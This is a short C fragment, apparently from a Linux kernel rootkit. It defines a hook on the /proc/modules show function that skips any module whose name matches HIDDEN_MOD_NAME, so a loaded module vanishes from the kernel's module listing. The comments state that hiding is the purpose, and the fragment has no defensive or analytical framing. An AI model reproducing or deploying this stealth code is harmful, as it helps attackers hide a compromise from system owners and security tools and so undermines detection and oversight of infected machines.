asmlinkage int (*org_m_show) (struct seq_file *m, void *p);

// /proc/modules show entry iterates over all modules call m_show upon each one.
// if the current module's name is equal to the name we want to hide then don't continue
// with the original show call
static asmlinkage int hook_m_show(struct seq_file *m, void *p){
    struct module *mod = list_entry(p, struct module, list);
    if (strcmp(mod->name, HIDDEN_MOD_NAME) == 0){
        return 0;
    }
    return org_m_show(m, p);
}